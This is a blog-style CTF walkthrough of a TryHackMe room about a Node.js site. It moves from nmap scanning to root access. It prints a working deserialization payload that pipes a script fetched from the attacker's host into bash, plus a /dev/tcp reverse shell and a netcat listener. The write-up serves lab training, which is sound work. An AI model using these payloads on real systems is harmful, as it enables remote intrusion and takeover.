---
layout: post
title: "TryHackMe: Jax sucks alot............."
date: 2025-11-25 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, jason, walkthrough, ctf, nodejs, deserialization, rce, privilege-escalation, enumeration, reverse-shell, nmap, burpsuite, linux, pentesting, hacking]
render_with_liquid: false
media_subpath: /images/Jax/
description: "A quick walkthrough of TryHackMe's 'Jason' room, covering basic enumeration and exploitation steps."
---

# TryHackMe: Jax sucks alot CTF — Writeup | 25 November 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="Jax.png" alt="Room Banner" width="600"/>
</div>

---

## Overview
This room covers exploiting a vulnerable Node.js web application to gain initial access. You'll perform reconnaissance, identify a deserialization vulnerability, and escalate privileges to root. The walkthrough demonstrates practical techniques for enumeration, exploitation, and privilege escalation.
---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.49.147.197
```

**Scan Summary:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7f:30:c1:c7:ff:93:6b:e9:20:2f:bf:aa:a0:24:aa:52 (RSA)
|   256 90:2d:fd:e4:38:85:88:4a:5f:db:f8:7b:a7:51:72:7a (ECDSA)
|_  256 7c:5f:86:84:1f:77:57:7f:c3:d3:1a:23:f5:5d:dd:ab (ED25519)
80/tcp open  http
|_http-title: Horror LLC
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Port 22 (SSH) and Port 80 (HTTP) are open. The web server is running Apache on Ubuntu.

---

## Web Enumeration
### Browsing the Website
Accessing the web server on port 80 reveals a simple website for "Horror LLC". The homepage contains input fields that may be vulnerable to deserialization attacks.

<div align="center">
    <img src="website.png" alt="Horror LLC Homepage" width="600"/>
</div>

let's try to enumerate using brupsuite 
### Using Burp Suite for Further Enumeration
Using Burp Suite, we can intercept the requests and analyze the parameters. 

<div align="center">
    <img src="burpsuite.png" alt="Burp Suite Interception" width="600"/>
</div>
---

we saw cookie named "session" which is base64 encoded
decoding it we got

<div align="center">
    <img src="decoded_cookie.png" alt="Decoded Cookie" width="600"/>
</div>

we know the site built on nodejs and site is vulnerable to deserialization attack
so we can use this payload to get reverse shell

```
_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://<Your_IP>/shell.sh | bash',
function(error, stdout, stderr) { console.log(stdout) });\n }()
```

> **Note:** The deserialization payload used here is adapted from [this article on exploiting Node.js deserialization bugs for remote code execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). This technique leverages insecure handling of serialized objects in Node.js applications to achieve RCE.

In here first we need to setup a simple web server to host our reverse shell script

```bash
echo -e "sh -i >& /dev/tcp/<YOUR_IP>/1111 0>&1" > shell.sh
python3 -m http.server 80
```

Now, we need to set up a listener on our machine to catch the reverse shell:

```bash
nc -lvnp 1111
```

<div align="center">
    <img src="listener.png" alt="Netcat Listener" width="600"/>
</div>

Now, we can send the malicious cookie with the deserialization payload to the server from site. 

<div align="center">
    <img src="malicious_cookie.png" alt="Malicious Cookie" width="600"/>
</div>

After sending the request, we should receive a reverse shell on our listener.

<div align="center">
    <img src="reverse_shell.png" alt="Reverse Shell" width="600"/>
</div>

---

we have shell as ubuntu user. Now, let's find the user flag.

### User Flag
we saw there is two users in the home directory
dylan and ubuntu
navigating to dylan's home directory we found user.txt file

<div align="center">
    <img src="user_flag_location.png" alt="User Flag Location" width="600"/>
</div>

```bash
cat /home/dylan/user.txt
```
<div align="center">
    <img src="user_flag.png" alt="User Flag" width="600"/>
</div>

we have user flag now let's move to privilege escalation

## Privilege Escalation

### Sudo Privileges
sudo -l
<div align="center">
    <img src="sudo-l.png" alt="Sudo Privileges" width="600"/>
</div>

we saw user ubuntu have all sudo privileges without password, but can accessing root directly is not possible due to restricted shell.

so we use find command to find suid files

```bash
find / -perm -4000 -type f 2>/dev/null
```
<div align="center">
    <img src="suid_files.png" alt="SUID Files" width="600"/>
</div>

we saw /usr/bin/sudo has suid bit set. so we can use it to escalate our privilege to root

```bash
sudo sudo /bin/sh
```

<div align="center">
    <img src="root_shell.png" alt="Root Shell" width="600"/>    
</div>

### Root Flag
now we are root user let's capture the root flag
```bash
cat /root/root.txt
```
<div align="center">
    <img src="root_flag.png" alt="Root Flag" width="600"/>
</div>

---

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExajR2ejRlbjRuZW82Mmt0ejF0M2owNmRuNnpwb3A0cGllemdtZHJhaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YPhs6YoPXEJgFxERoG/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
